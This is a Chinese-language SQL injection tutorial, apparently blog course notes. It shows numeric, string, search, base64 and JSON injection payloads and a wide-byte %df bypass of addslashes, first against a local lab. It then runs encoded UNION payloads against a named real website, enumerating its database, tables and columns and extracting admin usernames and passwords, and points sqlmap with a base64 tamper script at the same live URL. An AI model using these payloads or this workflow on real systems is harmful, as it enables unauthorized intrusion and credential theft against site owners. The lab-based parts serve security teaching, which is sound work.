![1645146028721-a80a6972-767d-4411-8f3e-0588a72f50e3.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912132644617-173067773.png)

```plain
#知识点：
1、数据表现格式类型注入
2、字符转义绕过-宽字节注入
3、数字&字符&搜索&编码&加密等

#参考资料：
https://www.cnblogs.com/bmjoker/p/9326258.html
扫描，利用工具等都不会自动判断数据类型，格式等，所以即使有漏洞也测不出来，具体还是需要人工的去观察，进行工具的修改或加载插件再次探针才可以。


#SQL注入课程体系：
1.数据库注入    - access mysql mssql oracle mongodb postgresql等
2.数据类型注入 - 数字型 字符型 搜索型 加密型(base64 json)等
3.提交方式注入 - get post cookie http头等 
4.查询方式注入 - 查询 增加 删除 更新 堆叠等
5.复杂注入利用 - 二次注入 dnslog注入 绕过bypass等
```

- 本地源码-数字&字符&搜索&编码&JSON

数字

```plain
数字型 0-9
SQL语句：$sql="select * from sy_guestbook where id=$i";
http://127.0.0.1:8081/web/news.php?id=1
不需要单引号，也可以正常运行。
在数据库中执行：select * from sy_guestbook where id=1;
不用加引号，能正常运行，所以有一些数字型的注入点，不用加引号，就是不用考虑符号的闭合。
```

![1645148271844-90d3415a-9f2b-4692-b736-e45fd574f523.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912132658943-1178045758.png)

字符

```plain
字符型    a-z 中文，标点符号
SQL语句：$sql="select * from sy_guestbook where gTpl='$g'";
http://127.0.0.1:8081/web/news.php?gtpl=simple
需要单引号或者双引号 ，如果不用的话，那就回报错。会以为当成函数或者参数去执行。所以必须要用到引号，需要考虑符号的闭合，才能正确去执行SQL才能正常执行。
如果这样执行：select * from sy_guestbook where gName=PHP开源多功能留言板-随意留言板官方站;
正确的执行方法：select * from sy_guestbook where gName='PHP开源多功能留言板-随意留言板官方站';
```

![1645148860541-e6d7435d-1644-4bac-bd01-0528d928bff5.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912132659085-1185713646.png)

![1645148889207-adc5648b-52bf-4d47-aba8-b2bbc2759144.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912132659317-1902351315.png)

```plain
如何构造payload的呢？
http://127.0.0.1:8081/web/news.php?gtpl=simple' order by 17--+

原始的SQL语句：
select * from sy_guestbook where gTpl='$g'
传入的值
simple' order by 17--+
代入数据SQL语句执行：
select * from sy_guestbook where gTpl='simple' order by 17--+'
这样才是正确的SQL注入payload
```

![1645150888578-5aefbe4f-2c4e-4ae3-b10b-77360ab6b9f6.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912132700572-576098440.png)

```plain
执行：http://127.0.0.1:8081/web/news.php?gtpl=simple' +UNION+ALL+SELECT+1,database(),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17--+
就可以进行正确的注入语句。
```

![1645151176379-19129378-b6d3-4a98-8a55-bb88b1cb8923.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912132701959-851248856.png)

搜索

```plain
搜索型
SQL语句：$sql="select * from sy_guestbook where gName like '%$s%'";
http://127.0.0.1:8081/web/news.php?search=演示
有百分号%通配符和单引号，需要进行闭合
本身SQL语句：select * from sy_guestbook where gName like '%$s%'
写入语句：http://127.0.0.1:8081/web/news.php?search=演示%' +UNION+ALL+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17--+
代入执行：select * from sy_guestbook where gName like '%演示%' +UNION+ALL+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17--+%'
但是这种在后面闭合不了。
```

![1645151528559-766a6dbd-07aa-4d97-b0fd-bcff00f8317e.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912132702118-489985223.png)

```plain
SQL语句：http://127.0.0.1:8081/web/news.php?search=演示%' +UNION+ALL+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17 and '%'='
代入：select * from sy_guestbook where gName like '%演示%' +UNION+ALL+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17 and '%'='%'
这样子就正确执行。
```

![1645151747640-f62b1f39-f474-4358-8a90-4ed9cfc01865.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912132701292-1678954771.png)

编码

```plain
编码型&加密型
SQL语句：数据接受：$b=base64_decode($_GET['base']);     $sql="select * from sy_guestbook where id=$b";
http://127.0.0.1:8081/web/news.php?base=MQ==
数据进行编码（加密）后接收处理：
数据以编码（加密）值传递，发送编码值，对方常会进行解码后带入数据在进行SQL执行。在注入的时候，我们也要尝试对注入的payload进行编码后提交。
在注入的时候，需要进行编码后在进行注入：
正常语句：http://127.0.0.1:8081/web/news.php?base=1 UNION SELECT 1,database(),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17
经过编码后：
```

![1645152745503-bbbdd41f-3c2c-4dc8-a91c-587c9eb6f5f6.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912132700201-1136210806.png)

```plain
编码后：http://127.0.0.1:8081/web/news.php?base=MSBVTklPTiBTRUxFQ1QgMSxkYXRhYmFzZSgpLDMsNCw1LDYsNyw4LDksMTAsMTEsMTIsMTMsMTQsMTUsMTYsMTc=
```

![1645152782742-f0034b99-5dad-4d83-b17b-3cd8b25e925a.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912132702807-187043495.png)

JSON

```plain
json型  表现形式不一样，提交数据一样的
{“username”:"admin"}    键名和键值
取数据的时候，只会接收admin的值，不会接收双引号。

数据表现形式
json:
{"username":"admin","password":"xiaodi"}
常规：
username=admin&password=xiaodi

如何注入：
常规：username=admin and 1=1&password=xiaodi
json：{"username":"admin and 1=1","password":"xiaodi"}
json格式，参考：https://baike.baidu.com/item/JSON/2462549?fr=aladdin
```

![1645153512345-20778807-263d-4113-80a9-4deb2e21adc4.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912132700938-1903537591.png)

```plain
json提交数据包格式：
```

![1645153801540-8ad55800-4afd-4ada-9e08-0f09954b88d1.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912132701044-1324697246.png)

```plain
json注入payload应该怎么构造呢？
这里使用到post提交json={"username":"admin' order by 3#"}
```

![1645154654636-46df1a5d-f17c-470d-a72e-c4f3d9858569.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912132700964-8248436.png)

```plain
查询用户和数据库名：
json={"username":"admin' and 1=2 union select 1,database(),user()#"}
```

![1645154839886-b16bf86b-aff4-4bab-b285-68fcc7511c23.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912132701371-960386351.png)

------

- 本地靶场-字符转义处理防护-宽字节注入

```plain
SQL注入接收数据，但是数据会出现/ \这种符号
转义函数：addslashes
\n 换行
\n 字符串，但是电脑以为你是换行
对字符串进行转义，\\n进行转义。

%df就可以进行绕过，利用宽字节
原理：利用繁体字或者乱码，来进行占用两个字节。
\ 一个字节
� 两个字节
中文 两个字节
用到了addslashes函数后，再次进行注入的时候
注入payload：http://127.0.0.1:8081/web/news.php?gtpl=simple' order by 17--+
但是实际上的SQL语句执行时候：select * from sy_guestbook where gTpl='simple\' order by 17--+'
对'进行了转义，变成了\'
```

![1645161599431-ae19ab75-2b89-4e7f-96ac-bbde5e19a485.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912132702184-903833173.png)

```plain
利用%df来进行绕过 
访问：http://127.0.0.1:8081/web/news.php?gtpl=simple%df' order by 17--+
执行的SQL语句：select * from sy_guestbook where gTpl='simple�\' order by 17-- '
�就会把后面的\占用了，从而绕过了转义
```

![1645161786536-89d2dc62-fc3f-41a3-9a0b-95343bf5ac5b.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912132703186-630595389.png)

------

- 真实WEB-数据编码接受处理-base64注入

```plain
网站：knotsolutions.com/case_study_view.php?id=NA==
NA==是Base64加密类型 4
```

![1645155829166-157d6aa3-1f91-4cfe-b56c-3c5cfc49b8fc.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912132703823-1545054473.png)

```plain
那么我们应该如何注入呢？
注入语句：4 and 1=2 union select 1,2,3
经过base64编码后：http://knotsolutions.com/case_study_view.php?id=NCBhbmQgMT0yIHVuaW9uIHNlbGVjdCAxLDIsMw==
```

![1645156448923-6a16a621-9ecc-4cd0-a0ef-d443ea52d8eb.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912132703599-1074025817.png)

```plain
进行数据猜解：4 and 1=2 union select 1,database(),version()
进行编码：http://knotsolutions.com/case_study_view.php?id=NCBhbmQgMT0yIHVuaW9uIHNlbGVjdCAxLGRhdGFiYXNlKCksdmVyc2lvbigp
记录database的值：knotwebdb
```

![1645156627878-fe2021bd-311b-44c1-96dc-c4fafa19de0c.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912132703130-1780466164.png)



```plain
判断版本高于5.0，就可以用information_schema进行查询。
查询knotwebdb下的表明信息：
4 and 1=2 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='knotwebdb'
编码后：
http://knotsolutions.com/case_study_view.php?id=NCBhbmQgMT0yIHVuaW9uIHNlbGVjdCAxLGdyb3VwX2NvbmNhdCh0YWJsZV9uYW1lKSwzIGZyb20gaW5mb3JtYXRpb25fc2NoZW1hLnRhYmxlcyB3aGVyZSB0YWJsZV9zY2hlbWE9J2tub3R3ZWJkYic=
记录一下查询到的表：
admin,careers,casestudy,imguploads,ipadd,loginip,page,slider,socialmedia
```

![1645157742948-62c652cc-2e0e-4a7c-9cce-a52b472b758c.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912132703814-1519210503.png)

```plain
对admin下的表进行查询 
payload：4 and 1=2 union select 1,group_concat(column_name),3 from information_schema.columns where table_name='admin' and table_schema='knotwebdb'
编码后：
http://knotsolutions.com/case_study_view.php?id=NCBhbmQgMT0yIHVuaW9uIHNlbGVjdCAxLGdyb3VwX2NvbmNhdChjb2x1bW5fbmFtZSksMyBmcm9tIGluZm9ybWF0aW9uX3NjaGVtYS5jb2x1bW5zIHdoZXJlIHRhYmxlX25hbWU9J2FkbWluJyBhbmQgdGFibGVfc2NoZW1hPSdrbm90d2ViZGIn
记录列名entry_id,user_id,password,type,status
```

![1645158594420-6d95ed6b-7f49-46bf-8a00-01b7bc4f6db6.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912132703461-7838076.png)

```plain
查询admin下的uer_id和password的值：
4 and 1=2 union select 1,user_id,password from admin
编码后：
http://knotsolutions.com/case_study_view.php?id=NCBhbmQgMT0yIHVuaW9uIHNlbGVjdCAxLHVzZXJfaWQscGFzc3dvcmQgZnJvbSBhZG1pbg==
得到数据，完成注入。
```

![1645158966400-fc829704-3ea9-488e-8b7d-d2b65a80d4ea.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912132702762-89175488.png)

------

- 真实WEB-JSON数据格式&MD5加密数据

```plain
MD5加密数据：
https://www.wanhuabao.com/goodslist/2e2d7fbdea1afc51.html
2e2d7fbdea1afc51是md5加密类型。
```

![1645159792022-5cddf6b4-d008-474b-be2d-4d7c62595cfb.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912132702902-9365137.png)



```plain
json 格式类型：
https://www.aliyun.com/solution/industry/digitalfactory?spm=5176.19720258.J_8058803260.74.e9392c4aXqzSjs
```

![1645160112575-f217f26c-f649-483f-88be-a655679e6251.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912132702520-237229652.png)

------

- 工具脚本-SQLMAP-脚本Tamper使用指南

```plain
如果之前的SQL注入，sqlmap去跑，如果没有用到base64编码的脚本，那么他就不会判断出注入点。
执行：python310 sqlmap.py -u "http://knotsolutions.com/case_study_view.php?id="
```

![1645160779571-f8f6e869-a303-4672-9057-df6e7fe13266.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912132702770-127180557.png)

```plain
这时候需要使用到tamper脚本（SQLmap自带）：
python310 sqlmap.py -u "http://knotsolutions.com/case_study_view.php?id=" --tamper=base64encode.py
```

![1645160919520-470d0d25-7b5c-4a6b-b362-75783d4c483e.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912132703278-1912680499.png)

```plain
宽字节也可以进行绕过，在tamper脚本上，脚本名称：unmagicquoates.py

在php中，有magicquoates转义开关。
```